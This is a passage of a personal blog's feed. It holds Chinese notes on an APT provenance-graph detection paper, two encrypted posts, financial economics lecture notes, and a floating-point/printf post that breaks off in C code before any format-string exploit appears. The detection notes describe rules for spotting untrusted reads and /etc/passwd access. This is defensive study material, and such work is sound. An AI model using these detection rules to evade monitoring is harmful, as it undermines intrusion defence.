    <content type="html"><![CDATA[<p>本系列记录一些关于APT溯源构建provenance graph的论文阅读笔记。旨在学习论文中的一些idea。</p><h2 id="Overview">Overview</h2><p>这篇论文亮点是引入一个中间层把低维度的审计日志（通常它他们是各个程序的syscall日志），映射到高纬度的APT kill chain信息。</p><p>高纬度kill chain</p><p><img src="image1.png" alt=""></p><p>引入中间层TTPs, HSG</p><p><img src="image2.png" alt=""></p><p>此外还引入了一些剪枝的策略</p><ol><li>We show how this concept can help to assess the strength of dependencies between HSG nodes. Weak dependencies can then be pruned away to eliminate many false alarms.</li><li>Second, we develop noise reduction techniques that further de-emphasize dependencies that are known to be associated with benign activities.</li><li>Third, we develop ranking and prioritization techniques to prune away most nodes and edges unrelated to the APT campaign.</li></ol><h2 id="TTPs-Tactics-Techniques-and-Procedure-的构建">TTPs(Tactics, Techniques and Procedure)的构建</h2><p>from Audit Logs，会引入一些规则，比如下面这个例子。</p><p><img src="image3.png" alt=""></p><p>会引入一些规则，比如有监控到read的系统调用，从非信任IP读取数据，那么就把它记做一个Unstrusted_Read(S, P)对。S是socket, P是进程。</p><p>如果有一个P, 他申请了可执行的内存，并且这个P和Unstrusted_Read(S, P’)中的P’有关系（path_factor）那么，就把这个P加入Make_Mem_Exec(P,M)对中。</p><p>注：path_factor怎么算后面会讲。</p><p>上面的两个Make_Mem_Exec和Make_Mem_Exec会被归为高纬度，对应APT kill chain的Initial_Compromoise。</p><h2 id="HSG-high-level-scenario-graph-的构建">HSG(high-level scenario graph)的构建</h2><p>这部分其实很简单，每一个TTP是一个小节点，节点之前是否连线就是他们是否有prerequisites里面的关系。</p><p>ATP Stage是一个大节点。</p><p><img src="image4.png" alt=""></p><h2 id="HSG剪枝技术">HSG剪枝技术</h2><h3 id="Avoiding-Spurious-Dependencies">Avoiding Spurious Dependencies</h3><p>这里引入了弱关联和强关联的概念，比如下图的中nginx error.log。cat和nginx就是弱关联，可能黑客通过nginx入侵过程中产生了一些日志，然后被管理员用cat读到了。</p><p><img src="image5.png" alt=""></p><p>所以作者在这里形式化的引入一个ancestral cover AC(f)，它是由<code>∀p ∈ f ∃a ∈ AC(f) a = p or a is an ancestor of p</code> 所定义。</p><p>一个信息流f的每一个p，把这个p和它的祖先进程都加入一个集合，这个集合就是AC(f)。接着引入一个ACmin(f)的概念代表size最小的AC(f)。</p><p>注：这里类似于一个最大公约数的概念，如果nginx和cat由一个共同的祖先进程那么ACmin(f)就是1。显然这里nginx和cat并没有，所以ACmin(f)就是2。</p><p>因为一个node1到另一个node2可能有多条路径，f1, …, fn。每一个，路径都会有一个ACmin(f)，而这些ACmin(f)中最小的那个值就是上面path_factor想表达的东西。</p><p>path_factor(N1, N2) = minimum AC(f) of per path。</p><p>评论：看下来就是判断两个进程是否有共同的祖先，不知道为什么要搞得这么复杂。</p><h3 id="Noise-reduction-based-on-benign-prerequisites">Noise reduction based on benign prerequisites.</h3><p>作者认为一些长时间运行的良性进程可能也会触发TTP的规则，所以他会预先观察程序在良性环境情况触发TTPs的情况然后加成规则排除他们。</p><p>但是这样其实又会引入漏报，比如万一真的nginx在启动时会读/etc/passwd，然后他被当白样本学习了，造成黑客真的打进来的时候被忽略。</p><p>所以作者又提出，可以根据从/etc/passwd读出的大小来判断 -&gt; 读一次时正常，老是读就不正常了。</p><p>评论：感觉这就是一个笨办法，需要一个进程case by case的优化。</p><h3 id="Signal-Correlation-and-Detection">Signal Correlation and Detection</h3><p>因为kill chain有7步，所以会根据每一步最大的那个risk level，放进元组&lt;S1, S2, S3, …, S7&gt;</p><p><img src="image6.png" alt=""></p><p>然后根据这个元组算出一个分。</p><p><img src="image7.png" alt=""></p><p>基于两个主要标准设计的：(1) 灵活性和定制化，以及 (2) 随着步骤展开，APT步骤的相关性反映在分数的放大上。</p><p><img src="image8.png" alt=""></p><p>评论：这一步看起来还挺科学的</p><h2 id="完整的TTPs">完整的TTPs</h2><p><img src="image9.png" alt=""></p>]]></content>
    
    
    <summary type="html">本系列记录一些关于APT溯源构建provenance graph的论文阅读笔记。旨在学习论文中的一些idea。</summary>
    
    
    
    <category term="redteam" scheme="https://cl0und.xyz/categories/redteam/"/>
    
    
    <category term="paper reading" scheme="https://cl0und.xyz/tags/paper-reading/"/>
    
    <category term="redteam" scheme="https://cl0und.xyz/tags/redteam/"/>
    
  </entry>
  
  <entry>
    <title>Why did I buy INTC stock in Sep 2024</title>
    <link href="https://cl0und.xyz/2024/09/29/Why-did-I-buy-INTC-stock-in-Sep-2024/"/>
    <id>https://cl0und.xyz/2024/09/29/Why-did-I-buy-INTC-stock-in-Sep-2024/</id>
    <published>2024-09-29T08:03:08.000Z</published>
    <updated>2024-09-29T08:07:19.319Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f91a0365cfb00ed02a30097fbfc10f44eed43ee42d34eec548b11021124d900d">f8c89326e2dd27398d7b0a10fab7ffc5bbe7003240d706b98f5c34f6af465a7f8b3722f5e90c29961d9f8f4a455241c4eed99ab7cd5987b8f0a9067048b30b04c0b9a6295fb86caeb7d1d9e3a0112d8d59aa86ecd9b0603fe8d84b64dfce1a3e651275e60c7e4fa376d1bd526063a70980dafceeb4e29d78fda5a669b3996005eb2d7739aea79a60d429433b53c60827b2fc416ead2dc73148b8e2606c9f96abcc78124ecd5b69bd86f63826b10aca639969c64271c2bfbb1dbed0edf14173f84b4c3a087bfbbd465e717d123df0afe2bd1db5870294f0fae9b309f3b6f948ebf321d14e1f8c7e91f1ef8f3d9b5e768af2c8512a2fab7c7d44fc29426d5818a14aea29e97954e617b8d7f705751cda575131dbfa0b82b990d2898408e3eb6271066ab13bc9cdeb878e871254a3dffc4b9fde45c4a834ca0218757593f900a7444dab788047fe61b6d64e38f9f37a69f5b881f24739bf2c66e7c4c7203fd9b7430ca5da00b89e66ee2c73afaa9c504477ff019853fa1f43a9e9a93f03d9ea2520fc539fc2683e0083c12a604a9b17fdbcef47371963a30a2df713f3c09945bcaa812c12cf2da0a434bfe39d0b7862fbc66aeffcb3f2597027a5255560f40599a7a2f16881428185f74a4a34e45753306a7b3edfe855d6b2bce59a477cd96a311d8b2e35db05b60b531a2c3d2f9f72c2aa0ff4f5c5838cdb269b75d530452fdd1830002de35f4efa5788ad40f1e1cdeb7a24f34fd6e6615e0e9488897c921afc4dfbe9e6acd47465c98f55b5a0aadb3561b1ae68c4be148544515531a77b9e5487e7fdeb4998b5b6741fe99ac6cad33bfd5f8a898c2d07e01413fdcd1593095dccfecb5fd7607b99d2779f4cf0a985bba498c648de8444c0607a6b6d53b879be85f730e2e8b047741c2d5f78917bc53360b068460032d24213812a91ac5bdd0086b6bd6aeefdb069fbd13cb8545b9997f5e43e770822a6603c7bd9872a4de2ae3fc55e70814281d15cf866ec1fa4b1cf25a53b10ad1304a66a99ab5ebc23a89a70711a38bb9f35f747dc3c21a7802b2e3a601d76d55875afaa2bcc067f933130b821ee200adf86d6d3eea16a1dfd185b89012ebabce2df02f793e3f049adad72d1fa472fb2ee0af68aaa359ce8d66c7baba0b7e610ca147ff867cd8a091fce9ccdcbf4e17009eb0fe558c19e0082ddf7775ad9f9d2e63cfd72f07ae7cda3cfa3f7efa95962a083c5ed5855e81bfd1aeeeca167532f737496d60e5ff3ef7835c455f8d65fe07537cb34bb1c648b179f73980bd2fb3db117c8311452fb4f871822c1a9985a849a84d6667f974539fb4b759b6e77470c51a26cbb087f31ca381d3e04795b41fee495e599b49c80603c0197c0824112b2ebf03ba174734d392087de7e19c8a9d7566e441bc949dba6f5cd2e7300aede46822bf35d57f958cfc2300ee180e9480ecbdb9b9bdc2b5fb21c1ea26286105a436d9c087d721dda8587fa3c9420870b7d70ff90a6622b88ce774a4236ef073003c2ca8920c28676c3a7ad58412f2a56f5910e2479627bbb7232075d1221ff3720103b531f28976be17795bad46b76041c1a74f30dfabbb5f24fdfa99d270d5243e699d4a272280d0cea33bdb24a58e73dd5258593a5734ec275939c97c493cd6ba3425a4f9231c8d83fdddbad7b1fd562d857889d13145b314c88a9f6695e652035f790df3e88d0fefe6cf27717b413949a58c0040fbd9ae5129bf96c9320f2b0341c47e3752b4fe55ed658af81d4a129043d29ac6fa2a79e81343b3efc508ccf1cf63a92da16c56a78fb03d76b4950e630f0e11cbb2eb99e13d3a15c3359429cee52fab0bc11116b5bc05166b55e21c7c7978c10ef2ae009a4ef308ee2ff719d93afd8525a33af60dd8995c0a6389e46b7cc1e7ea86fee79d6c6ded61511b65958ee58e4e170048ac658ab7efa0d82f60059821d1080dde1f09a73b1b36337106fd8e8ec2ed761e2f8d7f96c411174fda6e83ea503885c87d17523f83b581bad9246a0d4d7b346148209499678ce9d9d4445ef0c9d663534216c526d7a3d2d95c51e53f9736d54cb04b27af90d1e07a8fa2bc02e664153058ae35e8ce14c93826625b8e5c93b382ef207e4dfebc3f9b7577bd0182694c8023876cd1e4d1d2d4f70f1894458badac5d27da515e4d17c2659346ddf54c46eaef9831309823a3a8f84dd88135c852855f4d8836a434763e63489d1c0a7aaa61f1f8215fc7445e6998e84e43afed36443ae779d969c63a243013dbef5688ba1e24736febfc2bb73409844824e5a1b2fa6658db873e83882d738b9a729288d96087ad4944247e6420e4eb75b136cf62d06895cbb0310ba0b8c7c8495ba5a82128c7240768fac5f173745936c0c5f2dc2d80a7e64b69b54007b41d2ebec6d3370350daa9bcdf8d571013c975676f472fafbc854510a3ca536f9f49bf4631a6112c8322cbdf1ec3d904e36f42de766a792bb959b2d4709bd278d66a20a0cd0b821a49233d3f231432f67b925307db3c482deb1f1cd4f78ceb361e36247037b59ae85ff8d35759310d4004c25aa2facbbf31dd0534ce3fc1baa051f7fda4b86c2c2fc56213e9bd897e21036f29b42e11b0100f4e27cb9ea3fff117fe5683cd08c0032be29316f97a5a4c7ec1baf8933ff76b7e8639882f335469b54b61f316e1d14bf1a8908c859ab0f35debbfe25b44e0d992d86f769688315e5a10a9540ed92ea55688b558adff5983a1e316a59d5eff6f27a20103077cd90084fe33bfe79a0e78b080bf64442a753418af2c4525bad263eb299486d5d372d08a19d536a5ec5f2e659f5a1d1524049cefb1b2e759f9cb119b34ad15f9ff24a8a7c682bd9bae71d541701086e2c6c21f8c55b2aba81950b93cce49ee62ae1a1d546434fee3f1458b5358107bc41a0f4db8b504879bd18ace3a63196ecf689b88b7e478bb324304b4991b42f12bb2ae75d67b102b8981683e7b48b770eadaa533a438a7ea214585aa480d93ef26d22bd015f6015200a54fbf45125934b78d70d61163a36705ddc96ecb82088cea429bb6a40db48a25e8fea59c3b2ad66f2117a4a9e99765e4997b9f2c5f4982a7c1106b5ee9da43832c277948ad1d998ee220a3f1c1d376386c6f918011085239581fb22971754cc7f32fa3946ac806f2b262647d2ace6492ddf888bea885b4871ad610d36d573e6290ce469cc55bb1eda0a7a423620460e57732411b533cb4052cf6553037daaf9be68ffb6518b87d53ae9858eb2c2911fcc4f29b56dcdc2a6f4a72058324a7a1c86acfd84b8c14ebcaa9061ce2feea681ace77a4dbdbd686584fe64b6dc1e98039def942a342e1355062aa78f9bcc164f5a24b3bad96c06672d4b8c22c0348e568d239c6c03ec7ecb19dccc0e5478c33c331cf74769d0234ad20ec37834c635bd78cd23eca1c5aa24511fbbb10ec204aa8bec716859fa297fda81350212776e4339b6f8c37462139324eb622a604e8a056f66f90a7f0418815d1653ad8be3f34a5b7c1cd3b11b9c988669904ac03b3233e8088254e3c0b7a1aa05af00f0869472f9a656437357a4c64d47f2519c17c839694dfb628ab2a2df904230b4598024a84c05ba30282f778e8826dc9f8f8f6673a7773562dea91ebe1e6a7a5e0e0b073a00667fc2d8001346b0f76746fc0f40f0831c5e7ef0fbefc1e9e68caff76a39ab8ac77c0506d872399c9c541804fbfb91876e5a6aa63d93b5e24ae327e5ac03c94b0e51611ffd6da1ab149483c5b1e14679d964e7a8064e2648a6910c2b4c9eff3bc661030da674f5a137d65635c39fee12030d8e0380c648a4474eeb49740ab2366d5351c396d4f6ec86d8f43fb00218e1a16f5f5a98c34ca3e2d162910091bef0e80f701a97d819821194b7f81a36948522d4d7839de368d75b9238979d0c8d2c38d2294536876a0e166618fede2092b2b5fdc6bc30591449b8be7d4917282426176afa6b1f495e6d145948e8c94553c655a7899afc4df69494bd4b15424f4463673734cdef7471fc8c6b88b7ad8d0243405ef48e3ce488d8eb35fa8408bd9098b2141c158739414df8d31503b939ea55259c28e0aeb9bfd8bfab8b2cb51a86c34c7d87fc14e1f5ec4ba2a60ed9cf6b4b5ef5bda1783a7b8c708e95fa8a9d5d728fb1cdc77753212b94c16d679e302c6c30dbda4a18bb50b4ed8eda7fdd16f73e4830739624a0c7dcdb5af9c563e02c99e906a6ff3f69a7a271a2b4b3e6a65abcd0f4e76557e362bb347c23b7f7425874a7443a707fb370649aee0f50af59b870971fa0e0317781</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="stock" scheme="https://cl0und.xyz/tags/stock/"/>
    
  </entry>
  
  <entry>
    <title>Financial Economics Lecture1 Foundations, Approaches, and Key Concepts in Asset Pricing</title>
    <link href="https://cl0und.xyz/2024/09/14/Financial-Economics-Lecture1-Foundations-Approaches-and-Key-Concepts-in-Asset-Pricing/"/>
    <id>https://cl0und.xyz/2024/09/14/Financial-Economics-Lecture1-Foundations-Approaches-and-Key-Concepts-in-Asset-Pricing/</id>
    <published>2024-09-14T15:22:35.000Z</published>
    <updated>2024-09-14T15:24:55.895Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><h2 id="I-Introduction-to-Financial-Economics">I. Introduction to Financial Economics</h2><h3 id="A-Definition-and-Scope">A. Definition and Scope</h3><ul><li>Financial Economics: The branch of economics focuses on assigning financial assets efficiently.</li><li>Core task: Understanding and determining the pricing of financial assets.</li></ul><h3 id="B-Key-Concepts">B. Key Concepts</h3><ol><li><p>Assets: Claims on future economic benefits.</p></li><li><p>Two critical dimensions in financial behavior:</p><ol><li>Intertemporal nature of decisions</li><li>**Uncertainty (risk) **associated with future outcomes</li></ol></li></ol><h2 id="II-Overview-of-Financial-Markets">II. Overview of Financial Markets</h2><h3 id="A-Basic-Structure">A. Basic Structure</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Funds Suppliers (Asset Buyers) → Investment → Funds Demanders (Asset Sellers)  </span><br><span class="line">                                ← Return ←  </span><br></pre></td></tr></table></figure><h3 id="B-Key-Focus">B. Key Focus</h3><ul><li>Central question: Determining asset prices</li><li>Pricing mechanism: Driven by supply and demand, which are derived from human behavior</li><li>Challenges: Human behavior is <strong>dynamic</strong> and <strong>uncertain</strong></li></ul><h3 id="C-Corporate-Finance">C. Corporate Finance</h3><ul><li>Special case: When asset sellers are corporations</li></ul><h2 id="III-Approaches-in-Financial-Economics">III. Approaches in Financial Economics</h2><h3 id="A-Equilibrium-Pricing">A. Equilibrium Pricing</h3><ul><li>Method: Build a model incorporating human preferences and constraints to deduce behavior and determine supply and demand.</li><li>Advantage: Can determine asset prices from fundamental principles.</li><li>Disadvantage: Relies on assumptions that may be inaccurate or oversimplified.</li></ul><h3 id="B-No-Arbitrage-Pricing">B. No-Arbitrage Pricing</h3><ul><li>Method: Deduce asset prices based on known prices of other assets.</li></ul><h3 id="C-Financial-Frictions-Analysis">C. Financial Frictions Analysis</h3><ul><li>Focus areas: Information asymmetry, period mismatch</li></ul><h3 id="D-Behavioral-Finance">D. Behavioral Finance</h3><ul><li>Approach: Incorporates “irrational” factors to better understand the behavior of market participants.</li></ul><h2 id="IV-Market-Efficiency-and-Behavioral-Finance">IV. Market Efficiency and Behavioral Finance</h2><ul><li>Question of market efficiency remains central to financial economics.</li><li>Behavioral finance helps explain deviations from traditional rational models.</li></ul><h2 id="V-Assets-and-Rate-of-Return">V. Assets and Rate of Return</h2><h3 id="A-Basic-Model-Single-Period-Binary-Tree">A. Basic Model: Single-Period Binary Tree</h3><ul><li><p>Current price: P</p></li><li><p>Future payoffs:</p><ul><li>Xu (probability q)</li><li>Xd (probability 1-q)</li></ul></li></ul><h3 id="B-Key-Questions">B. Key Questions</h3><ol><li><p>Given Xu and Xd, how to determine P?</p></li><li><p>What determines Xu and Xd? (Beyond the scope of financial economics)</p><ol><li>Industry factors</li><li>Business strategies</li><li>Competitive landscape</li><li>Management aspirations</li><li>Macroeconomic conditions</li><li>Geopolitical factors</li></ol></li></ol><h3 id="C-Return-Calculations">C. Return Calculations</h3><ul><li>Upside return: ru = (Xu/P) - 1</li><li>Downside return: rd = (Xd/P) - 1</li><li>Expected return: E® = q*ru + (1-q)*rd = E(x)/P - 1</li></ul><h3 id="D-Price-Return-Relationship">D. Price-Return Relationship</h3><ul><li>Inverse relationship between price (P) and expected return E®</li><li>Higher asset price → Lower expected return</li><li>Lower asset price → Higher expected return</li></ul><h3 id="E-Risk-Return-Trade-off">E. Risk-Return Trade-off</h3><ul><li>“Good” assets typically have higher prices but lower expected returns</li><li>“Bad” (riskier) assets typically have lower prices but higher expected returns</li><li>Market equilibrium tends to balance risk and return across assets</li></ul><h2 id="VI-Equilibrium-Pricing-Absolute-Pricing">VI. Equilibrium Pricing (Absolute Pricing)</h2><h3 id="A-Concept">A. Concept</h3><ul><li>Price is determined by the interaction of supply, demand, and behavior (under uncertainty/risk)</li><li>Aims to price assets from fundamental principles</li></ul><h3 id="B-Expected-Utility-Theory">B. Expected Utility Theory</h3><ul><li><p>Addresses limitations of simple expected value calculations</p></li><li><p>Example: St. Petersburg paradox (where E = ∞)</p><ul><li>Demonstrates why expected value alone is insufficient for decision-making</li></ul></li></ul><h3 id="C-Risk-and-Asset-Pricing-An-Example">C. Risk and Asset Pricing: An Example</h3><ol><li><p>Steel Company:</p><ol><li>Current price: Ps</li><li>Future dividends: 50% chance of 25,15</li></ol></li><li><p>Pharmaceutical Company:</p><ol><li>Current price: Pp</li><li>Future dividends: 50% chance of 40,0</li></ol></li></ol><p>Despite pharmaceutical companies having higher variance (risk), Pp should typically be higher than Ps. This counterintuitive result stems from the potential for higher returns, not just the risk involved.</p><h3 id="D-Performance-Evaluation-Beyond-Simple-Metrics">D. Performance Evaluation: Beyond Simple Metrics</h3><p>Consider two portfolio managers:</p><ul><li><p>Manager A: Average return rA = 10%, standard deviation σA</p></li><li><p>Manager B: Average return rB = 8%, standard deviation σB</p></li><li><p>If σA &lt; σB, can we conclude A is better than B?</p><ul><li>Not necessarily. Must consider risk-adjusted returns and investor preferences.</li></ul></li></ul><h2 id="VII-No-Arbitrage-Pricing-Relative-Pricing">VII. No-Arbitrage Pricing (Relative Pricing)</h2><h3 id="A-Concept-2">A. Concept</h3><ul><li>Based on the Law of One Price (LOOP)</li><li>Riskless profit opportunities violate LOOP</li></ul><h3 id="B-Examples">B. Examples</h3><ol><li><p>Fast Food Combo:</p><ol><li>If Hamburg = 1 and Coke=1, then (Hamburg, Coke) combo should = $2</li><li>Any deviation creates arbitrage opportunity</li></ol></li><li><p>Investment Box:</p><ol><li><p>Box transforms 1 into 1.02 (2% return)</p></li><li><p>Bank deposit rate = 3%</p></li><li><p>Box value?</p><ul><li>Not zero, despite lower return than bank</li><li>Option value exists if interest rates fall below 2% in future</li></ul></li></ol></li></ol><h3 id="C-Replication-and-Hedging">C. Replication and Hedging</h3><ul><li>Core of no-arbitrage pricing: Replicating cash flows</li><li>Enables hedging strategies</li><li>Fundamental to modern financial innovations</li></ul><h2 id="VIII-Financial-Frictions">VIII. Financial Frictions</h2><h3 id="A-Maturity-Mismatch">A. Maturity Mismatch</h3><ul><li>Lenders prefer liquidity (short-term)</li><li>Borrowers need stability (long-term)</li><li>Example: Construction projects require stable, long-term funding</li></ul><h3 id="B-Role-of-Financial-Intermediaries">B. Role of Financial Intermediaries</h3><ul><li>Banks transform short-term deposits into long-term loans</li><li>Crucial for economic stability and growth</li></ul><h2 id="IX-Market-Efficiency-and-Behavioral-Finance">IX. Market Efficiency and Behavioral Finance</h2><h3 id="A-Efficient-Market-Hypothesis-EMH">A. Efficient Market Hypothesis (EMH)</h3><ul><li>Fama’s theory: Markets rapidly incorporate all available information</li><li>Implies no persistent arbitrage opportunities</li></ul><h3 id="B-Challenges-to-EMH">B. Challenges to EMH</h3><ul><li><p>Shiller’s counterarguments</p></li><li><p>Behavioral Finance insights:</p><ul><li>Irrationality: e.g., overconfidence bias</li><li>Limited arbitrage: Practical limits to exploiting mispricings</li></ul></li></ul><h3 id="C-Martingale-Concept">C. Martingale Concept</h3><ul><li>Mathematical foundation for fair games and efficient markets</li></ul><h2 id="Key-Takeaways-from-Lecture-1">Key Takeaways from Lecture 1</h2><ol><li>Financial Economics focuses on the efficient allocation of financial assets and understanding asset pricing.</li><li>The field employs various approaches: equilibrium pricing, no-arbitrage pricing, and consideration of financial frictions.</li><li>Understanding risk, return, and their relationship is crucial in asset valuation.</li><li>Market efficiency and behavioral factors play significant roles in financial markets.</li><li>Both absolute (equilibrium) and relative (no-arbitrage) pricing methods are essential tools in financial economics.</li><li>Financial frictions, such as maturity mismatches, highlight the importance of financial intermediaries.</li></ol>]]></content>
    
    
    <summary type="html">the first class of economics</summary>
    
    
    
    
    <category term="economics" scheme="https://cl0und.xyz/tags/economics/"/>
    
  </entry>
  
  <entry>
    <title>eBPF基础学习</title>
    <link href="https://cl0und.xyz/2024/09/14/eBPF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>https://cl0und.xyz/2024/09/14/eBPF%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-09-14T14:32:48.000Z</published>
    <updated>2024-09-14T14:50:13.856Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="24d53a4ad2096f00be74e8ca564d6c97bfcf057dc4ed1bcac79073ae13ec9f48"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    
    <category term="ebpf" scheme="https://cl0und.xyz/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>浮点数精度，printf，格式化字符串漏洞</title>
    <link href="https://cl0und.xyz/2024/08/31/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%EF%BC%8Cprintf%EF%BC%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cl0und.xyz/2024/08/31/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%B2%BE%E5%BA%A6%EF%BC%8Cprintf%EF%BC%8C%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-08-31T06:43:26.000Z</published>
    <updated>2024-09-14T14:22:24.639Z</updated>
    
    <content type="html"><![CDATA[<!-- more --><p>文中各种图片引用自不同的blog都附在参考链接里面了，侵删。</p><h2 id="浮点数的存储">浮点数的存储</h2><p>单精度浮点数 (single precision floating point) 的表示方式遵循 IEEE 754 标准。这种表示方式由32位组成：</p><ul><li>1位用于符号位 (sign bit)</li><li>8位用于指数 (exponent)</li><li>23位用于尾数 (mantissa or significand)</li></ul><p><img src="image1.png" alt=""></p><p>双精度类似，此时指数位有11，尾数有52</p><p><img src="image2.png" alt=""></p><p>手工转换的思路是分别把整数部分和小数部分换成二进制，然后缩放成1.X * 2^n的二进制版本科学计数法。此时</p><p>.X部分为尾数部分，n为<strong>阶码</strong>需要加上127，如果n为1那么指数位就是127+1 = 128。之所以会有这个规定，是为了考虑到n为负数的情况（只考虑正数的情况，十进制下小于1）。</p><p>下面以8.5存储为单精度为例</p><ul><li><p>8.5 是正数，所以符号位为 0。</p></li><li><p>整数部分是 8，转换为二进制是 1000。</p></li><li><p>小数部分是 0.5。将其转换为二进制：</p><ul><li>0.5 × 2 = 1.0，整数部分是 1</li></ul></li><li><p>所以，0.5 的二进制是 0.1。</p></li><li><p>8.5 的二进制表示为 1000.1。</p></li><li><p>将二进制数表示为规范化形式：1.0001 × 2^3。</p></li><li><p>指数是 3，加上偏移量 127，得到 130。</p></li><li><p>130 的二进制表示为 10000010。</p></li><li><p>尾数是规范化形式中小数点后的部分：0001，补足到 23 位：00010000000000000000000</p></li><li><p>符号位 + 指数 + 尾数 = 0 10000010 00010000000000000000000。</p></li></ul><p><img src="image3.png" alt=""></p><h2 id="浮点数的分类">浮点数的分类</h2><p>当然其实上面介绍的只是浮点数的一种类型的求值方式：规格化浮点数。</p><p>浮点数有三种分类，<a href="https://www.cnblogs.com/zuoxiaolong/p/computer11.html">这篇文章</a>总结非常好直接抄过来</p><ol><li><p>规格化浮点数</p><ol><li>此时指数位范围是1至254，因此对应阶码的范围则为-126至127</li><li>尾数位是一个小于1的小数，在计算真实浮点数字的时候需要+1 （真实的尾数M = 1 + f）。相当于我们省掉了1位二进制，形成了浮点数表示的约定，默认尾数的值还有一个最高位的1。</li></ol></li><li><p>非规格化浮点数，</p><ol><li>指数位全为0</li><li>非规格化的方式与规格化不同，它不会对尾数进行加1的处理，也就是说，真实的尾数M = f。这是为了能够表示0这个数值，否则的话尾数总是大于1，那么无论如何都将得不到0这个数值。</li></ol></li><li><p>特殊值</p><ol><li>在阶码全为1时，如果尾数位全为0，则表示无穷大。符号位为0则表示正无穷大，相反则表示负无穷大。</li><li>倘若尾数位不全为0时，此时则表示NaN，表示不是一个数字。</li><li>这一点在Javascript当中有一个相关的函数与这个NaN的含义有点类似，它的作用是用来判断一个参数是否是一个数字。</li></ol></li></ol><p><img src="image4.png" alt=""></p><p>由此可以看出来，浮点数的取值范围。</p><p><img src="image5.png" alt=""></p><p>举个例子非规格化浮点数（考虑单精度，正数）</p><ol><li>非规格化数的最小值 = 2^-23 * 2^-126 = 2 ^ -149</li><li>非格式化数最大值 = (2^-1 + 2^-2 + … + 2 ^ -23)* 2^-126 = (1−2^-23) * 2^-126</li></ol><p><a href="https://blog.csdn.net/dreamer2020/article/details/24158303">引用结论</a></p><blockquote><p>通过上面的分析可以发现，尽管浮点数表示的范围很广，但由于精度损失的存在，加上幂次的放大作用，一个浮点数实际上是表示了周围的一个有理数区间。如果将浮点数绘制到一个数轴上，直观上看，靠近0的部分，浮点数出现较密集。越靠近无穷大，浮点数分布越稀疏，一个浮点值代表了周围一片数据。从这个意义上来说，浮点数不宜直接比较相等，它们是代表了一个数据范围。实际应用中，如果要使用浮点数计算，一定要考虑精度问题。在满足精度要求的前提下，计算结果才是有效的。 在计算精度要求情形下，例如商业计算等，应该避免使用浮点数，严格采取高精度计算。</p></blockquote><p><img src="image6.png" alt=""></p><p>再啰嗦一句，帮助理解，也就是这里非规格化数的最小值2 ^ -149代表了 0到2 ^ -149之间的所有正数。</p><h2 id="浮点数的精度">浮点数的精度</h2><p>单精度浮点数的精度主要由尾数部分决定。由于尾数有23位，加上隐含的1位，总共有24位的有效数字。</p><p>现在，我们来计算这 24 位二进制数可以表示多少位十进制有效数字：log₁₀(2²⁴) ≈ 7.22</p><p>这意味着单精度浮点数理论上可以精确表示大约 7位十进制有效数字，这里再对有效数字做一个定义</p><ul><li>非零数字总是有效数字。</li><li>在非零数字之间的零是有效数字。</li><li>小数点左边的前导零不是有效数字。</li><li>小数点右边的尾随零可能是有效数字，这取决于测量的精度</li></ul><h2 id="再看prinf">再看prinf</h2><p>抄这篇文章的题目，读者可以思考一下输出是什么。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> c = a/b;</span><br><span class="line">    <span class="type">float</span> d =  *(<span 